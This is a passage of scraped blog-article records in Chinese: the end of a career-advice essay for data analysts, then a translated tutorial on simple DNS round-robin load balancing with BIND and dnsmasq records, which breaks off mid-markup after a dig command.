事方式方法、为人处事以及一些潜规则，更多时候只能靠悟，说出来就可能不大好了，因此需要不断领悟。毕竟，悟性这东西是很重要的。</p>\n<p>还有，沟通是码农普遍的老大难问题，建议重视起来并加强。</p>\n<p>你甚至可以学一下投影仪或打印机怎么用。（说不定可以靠这个技能在老板或同事前面大攒人品哦~~）</p>\n<p>如果你有机会和很牛的人在一起工作，那你太幸运了。你可以多请教优秀的人一些问题，也可以平时多观察那些优秀之人的做事方式、工作习惯，看看有哪些好的地方、好的品质值得你学习。只要吸纳进来，就可以转化为你的优点，推动你进步。</p>\n<p>我毕业的第三年，看到俞敏洪老师在一些演讲中提及他大学时读了800多本书，很受触动，真正认识到了读书的重要性，于是给自己制定了一年读50本书的计划，什么书都读，三年左右时间，我的心智和心态都发生了很大的改变，完全不一样了。</p>\n<p>俗话说：“三人行，必有我师。”每个人都有每个人的优点，对于所遇到的每个人，建议多欣赏别人的优点，少抨击别人的缺点，这样你就可以“兼收并蓄”，逐步塑造更好的自己。</p>\n<h3>三、3-5年，“技多不压身”，拓展能力边界</h3>\n<p>当迈过了最初的3个年头后，你的技术越来越好，也做了不少项目，也越来越清楚自己未来的方向，但你也会发现有越来越多的东西还需要去学习和加强。</p>\n<p>这个时候，你的知识是零散的，还远未形成体系。你也许还需要花些时间好好梳理和总结过去几年积累的经验和知识，不断沉淀，形成自己的知识体系和方法论。在梳理的过程中，你会不断清楚自己有什么，缺什么，哪些地方弱，哪些地方强，未来需要花多少时间补强哪项技能，等等。</p>\n<p>你可以沿着数据的整个流程，即数据采集、数据存储、数据处理、数据分析/开发模型、报表计算、数据可视化，不断拓展自己的能力边界，最好在流程中的各个环节都做过项目。</p>\n<p>例如，在数据采集环节，你可以学一下爬虫技术。</p>\n<p>这个时候，你不再是新人。新人大多是等着别人安排工作，并在详细的指导之下完成。而你慢慢成长为老司机了，需要独立完成一个个任务了，如独立开发一个模型、写一份会员分析报告、梳理关于近期营业额下降原因分析的思路，等等。你需要不断适应在无人指点的情况自己去寻求问题解决办法，也可能需要应对此前没有遇到过的新情况并独立展开调查研究。几乎没有人帮你，你也没法指望别人明确告诉你怎么做。而你需要的是，历经3年之后成长路上的一个质变。</p>\n<p>在这过程中，你可能需要不断查找资料，咨询别人，并加以思考，梳理出有效的方案，最后落地执行。在这过程中，可以有效训练以下几方面的能力：</p>\n<ul class=\"list-paddingleft-2\">\n<li>查找资料</li>\n<li>会问问题</li>\n<li>总结梳理</li>\n<li>写作能力</li>\n</ul>\n<p>关于总结梳理，建议定期做，常常做，每天做，建议养成一个日常习惯。</p>\n<p>对于不同问题和场景的思路整理总结，常常需要方法论指导，如麦肯锡金字塔原理、结构化思维等。关于这些方法论，不仅要谙熟于心，也需要将其应用到实际工作当中。这是受用一生的知识，你也可将其运用到你的日常生活中，用以解决你日常的问题和需求。</p>\n<p>关于思路的整理，可以借助思维导图工具。</p>\n<p>另外，请注重培养自己的数据敏感性和数据思维，越早开始越好。关于如何培养数据思维，将以另外的文章单独阐述。</p>\n<p>EXCEL是操作和处理数据最方便的工具，也是必须掌握的办公软件。很多人会用EXCEL，但根本不精通EXCEL。简历里那句“精通EXCEL等办公软件”（你的简历里是否也这样写~~），常常是一个谎言。建议你好好学一下EXCEL，包括展示数据、透视表、函数、画图、动态图表、VBA等。不要仅仅停留在最粗的层面，比如画图，使用默认设置也可以画出一个图表，但是不好看，阅读体验不好。关于怎么用EXCEL画好图表，推荐阅读《EXCEL图表演示之道》、《最简单的图形与最复杂的信息》。</p>\n<p>写分析报告，难免会用到PPT。关于如何写好PPT这件事，从来就不是件轻松的事。但你可以给自己一些时间去学，比如3年、5年、甚至10年。刚开始，写得不好没关系，但一定不要放过每一次锻炼的机会。</p>\n<p>关于PPT的技巧，将有更多的文章单独阐述。</p>\n<p>在领导眼里，会写材料的人比会编程的人更有存在感。而且，会写材料的人总是显得那样“稀缺”。如果你是别的同事眼里的“会Coding的人中最会写PPT+会写材料的人中最懂技术”的那个人，那你将会很受重用。</p>\n<h3>四、5-10年，“不忘初心”，有所为有所不为</h3>\n<p>在别人眼里，数据分析和开发模型是很高大上的。但这高大上，常常处在很多尴尬的处境。数据分析汇报一次之后就没了下文，模型开发了，部署了，也定期出数了，但就是没用起来。用户方或业务方觉得这些东西对他们业务帮助不大，可有可无（虽然包装一下用来忽悠一下投资人可能也有点用处），还不如一个经验规则来得有效，简单粗暴，省时省力。</p>\n<p>关于经验规则和算法模型之争，如果你坚定认为你开发的模型比业务方所认为的经验规则更有效，那么，请你拿出“证据”，用数据说服业务方，让他们改变观念，觉得你是对的。</p>\n<p>之前信奉的那句“数据驱动业务”，是不是错了吗？</p>\n<p>此刻，请回到初心吧！我们的初心是什么？那就是用数据帮助业务解决问题，用数据辅助业务决策。数据分析只是其中一种形式，当然还有其它。因此，不要迷恋数据分析，不要迷恋算法模型。“不管黑猫白猫，抓到老鼠就是好猫。”</p>\n<p>如果你能够从数据分析和算法模型的困囿中挣脱出来，那么你将发现你面对的是广阔天地，你可以在数据的海洋里肆意遨游。</p>\n<p>你或许开始注重追求数据解决方案的实用性，强调落地执行，更看重应用效果。</p>\n<p>你必须真正理解业务方的需求。当业务方进行选品和定价时，他们需要一份关于竞品的商品数据来做参考；当业务方想随时看到当前时刻的订单量（特别是618或双11），你需要实时汇总数据并实时呈现给他们；当业务方既想看总体的经营数据，也想看各区各部门各门店的经营数据，你需要开发一个多维度层层钻取查看的功能……而这些都不是数据分析和算法模型，但这些也是数据应用，也能产生数据价值。</p>\n<p>如果有机会，不妨尝试做个数据产品经理。数据产品经理需要从产品角度实现业务功能。在当前数据产品化的趋势下，这是一个很有挑战性的事情，不容易做好。毕竟，讨好一大群用户，比单独讨好一个用户要难得多。</p>\n<p>在数据产品设计里，数据可视化是一个重要的事情。好的图表会说话，好的功能会抓住用户的心。即便撇开数据产品，我们在分析报告里也会需要数据的可视化表达。</p>\n<p>数据可视化传递的是一种明确的数据信息，一目了然，赏心悦目。从画好一个数据图表，到功能版式的精心设计，再到对功能细节良苦用心的把握，你需要不断精进。一旦你感兴趣，你将会很快沉迷于其中，因为那是一种美的表达。</p>\n<h3>五、10年+，“砥砺前行”，创新、创业、创造</h3>\n<p>是的，你已经做了十年，希望你无悔当初的选择与坚持。</p>\n<p>此时你也遇到很多瓶颈，或许你空有一身好武艺但得不到老板重用，或许你想做个实力派但处于各种原因离技术越来越远，或许你很努力但职务仍然上不去，或许你面对繁重的工作心有余而力不足，各种分身乏术……你一直在等待和寻找着机会，突破自己。</p>\n<p>此时你也渐渐步入了中年，或许你开始变得油腻，或许你的身材早已远离苗条，或许岁月在你的脸上、头发上开始留下痕迹，或许你的思想渐渐固化，不能与时俱进了……最重要的，或许就是你早已没有了当初的激情。</p>\n<p>如果你在一个行业待了十年，在别人眼里，无论怎样，都已是个专家，所以，请自信！</p>\n<p>你还需要在圈里有一定的影响力，需要树立个人品牌，最好能在圈里外有较好的传播。如此这样，当别人提起你的时候，他们常会这样说，“这个人分析能力很强”，“他在数据领域造诣很深”，“他建模能力出众”……如此种种，在他们眼里对你印象最深刻的标签将会是你最想要的那个。</p>\n<p>或许你需要逐步提升讲课程的能力，这是一种知识分享与传递，也是提高个人影响力的有效途径。不要放过任何露脸的机会哦！</p>\n<p>你或许已经深刻明白，分析的结果、开发的模型、数据产品只有被应用起来，才真正算是产生价值。你会越来越关注数据应用的问题。当你开始聚焦这个问题时，你会问自己，”用户或业务方真正需要什么？“这个时候，你得有用户思维了。你会加强对业务的重视程度，也会不断回到业务层面去思考数据的实际应用。</p>\n<p>你最好也时刻关注当前社会的趋势和潮流，特别是与互联网相关的。这样可以让你保持开放的心态，洞悉社会的风向，驱动自己的思考，挖掘潜在的机会。你可以从中了解当前行业中成功的数据应用案例，开拓自己的思路，多想想用数据还可以帮助各行业解决什么问题，可能的机会在哪里，自己应该怎么做。</p>\n<p>你可能要面对的是，数据应用对一个行业或一个企业来说，永远都是在探索。某个数据应用思路或项目一旦成功了，就会得到越来越多的资源投入，越做越大，如果失败了，就会立刻遭放弃。因此，要有创新精神，要有创新的勇气和自信。</p>\n<p>职位上来说，你可能开始担任一定的管理工作。因此，你还得学会团队管理，懂得如何向上管理和向下管理。</p>\n<p>你的日常事务会越来越多，你也需要学会有效管理自己的时间。你可以成为一名“清单控”。但必须指出的是，时间管理，最本质的还是自我的管理，对精力的管理。你需要开始意识到加强身体锻炼的重要性了。一来，保持身材，对发福说不，二来，保持精力的旺盛，抵抗疲倦，第三，通过不断挑战自己的身体极限来刺激自己，找回激情。</p>\n<p>你也需要开始认真考虑如何平衡工作和家庭的问题了。</p>\n<p>这个世界一直在变。我们也一定要“善变”，顺势而为。</p>\n<p>不管是10-20年前的BI（商务智能），过去几年的大数据，这年头炒得火爆的人工智能，还是未来涌现的更多概念，只要我们足够开放，敏感洞察，挖掘机会，创新、创业、创造，不断成就自己。</p>\n<p>汪国真在《热爱生命》里写道：“我不去想是否能够成功，既然选择了远方，便只顾风雨兼程。”</p>\n<p>英雄不问出身，只要你下定决心，即使再晚出发，也会达到，还可以走得更远。</p>\n<p>最后，作为数据人，与你共勉，“不做数据的搬运工，要做价值的缔造者”。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114150\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114150votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114150\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "其他,数据分析", "url": "http://blog.jobbole.com/114150/", "url_obj_id": "52d5249e6e503caa3d53418ba9db1163"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "在 Linux 上用 DNS 实现简单的负载均衡", "create_date": "2018/06/25 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/learn/intro-to-linux/2018/3/simple-load-balancing-dns-linux\">Carla Shroder</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9777-1.html\">Linux中国/qhwdw</a>   </div><blockquote><p>DNS 轮询将多个服务器映射到同一个主机名，并没有为这里展示的魔法做更多的工作。</p></blockquote>\n<p>如果你的后端服务器是由多台服务器构成的，比如集群化或者镜像的 Web 或者文件服务器，通过负载均衡器提供了单一的入口点。业务繁忙的大型电商在高端负载均衡器上花费了大量的资金，用它来执行各种各样的任务：代理、缓存、状况检查、SSL 处理、可配置的优先级、流量整形等很多任务。</p>\n<p>但是你并不需要做那么多工作的负载均衡器。你需要的是一个跨服务器分发负载的简单方法，它能够提供故障切换，并且不太在意它是否高效和完美。DNS 轮询和使用轮询的子域委派是实现这个目标的两种简单方法。</p>\n<p>DNS 轮询是将多台服务器映射到同一个主机名上，当用户访问 <code>foo.example.com</code> 时多台服务器都可用于处理它们的请求，使用的就是这种方式。</p>\n<p>当你有多个子域或者你的服务器在地理上比较分散时，使用轮询的子域委派就比较有用。你有一个主域名服务器，而子域有它们自己的域名服务器。你的主域名服务器将所有的到子域的请求指向到它们自己的域名服务器上。这将提升响应时间，因为 DNS 协议会自动查找最快的链路。</p>\n<h3 id=\"toc_1\">DNS 轮询</h3>\n<p>轮询和旅鸫鸟robins没有任何关系，据我相熟的图书管理员说，它最初是一个法语短语，<em>ruban rond</em>、或者 <em>round ribbon</em>。很久以前，法国政府官员以不分级的圆形、波浪线、或者直线形状来在请愿书上签字，以盖住原来的发起人。</p>\n<p>DNS 轮询也是不分级的，简单配置一个服务器列表，然后将请求转到每个服务器上。它并不做真正的负载均衡，因为它根本就不测量负载，也没有状况检查，因此如果一个服务器宕机，请求仍然会发送到那个宕机的服务器上。它的优点就是简单。如果你有一个小的文件或者 Web 服务器集群，想通过一个简单的方法在它们之间分散负载，那么 DNS 轮询很适合你。</p>\n<p>你所做的全部配置就是创建多条 A 或者 AAAA 记录，映射多台服务器到单个的主机名。这个 BIND 示例同时使用了 IPv4 和 IPv6 私有地址类：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75459c962358977413\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfileserv.example.com. IN A 172.16.10.10\r\nfileserv.example.com. IN A 172.16.10.11\r\nfileserv.example.com. IN A 172.16.10.12\r\n\r\nfileserv.example.com. IN AAAA fd02:faea:f561:8fa0:1::10\r\nfileserv.example.com. IN AAAA fd02:faea:f561:8fa0:1::11\r\nfileserv.example.com. IN AAAA fd02:faea:f561:8fa0:1::12\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c962358977413-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c962358977413-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c962358977413-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c962358977413-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c962358977413-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c962358977413-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c962358977413-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c962358977413-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75459c962358977413-1\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.10.10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c962358977413-2\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.10.11</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c962358977413-3\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.10.12</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c962358977413-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a75459c962358977413-5\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c962358977413-6\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">11</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c962358977413-7\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">12</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c962358977413-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>Dnsmasq 在 <code>/etc/hosts</code> 文件中保存 A 和 AAAA 记录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75459c96d856404228\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n172.16.1.10 fileserv fileserv.example.com\r\n172.16.1.11 fileserv fileserv.example.com\r\n172.16.1.12 fileserv fileserv.example.com\r\nfd02:faea:f561:8fa0:1::10 fileserv fileserv.example.com\r\nfd02:faea:f561:8fa0:1::11 fileserv fileserv.example.com\r\nfd02:faea:f561:8fa0:1::12 fileserv fileserv.example.com\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c96d856404228-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c96d856404228-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c96d856404228-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c96d856404228-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c96d856404228-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a75459c96d856404228-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a75459c96d856404228-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a75459c96d856404228-1\"><span class=\"crayon-cn\">172.16.1.10</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c96d856404228-2\"><span class=\"crayon-cn\">172.16.1.11</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c96d856404228-3\"><span class=\"crayon-cn\">172.16.1.12</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c96d856404228-4\"><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c96d856404228-5\"><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a75459c96d856404228-6\"><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">12</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b4a75459c96d856404228-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p>请注意这些示例都是很简化的，解析完全合格域名有多种方法，因此，关于如何配置 DNS 请自行学习。</p>\n<p>使用 <code>dig</code> 命令去检查你的配置能否按预期工作。将 <code>ns.example.com</code> 替换为你的域名服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a75459c971693852546\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ dig @ns.example.com fileserv A fileserv AAA\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table 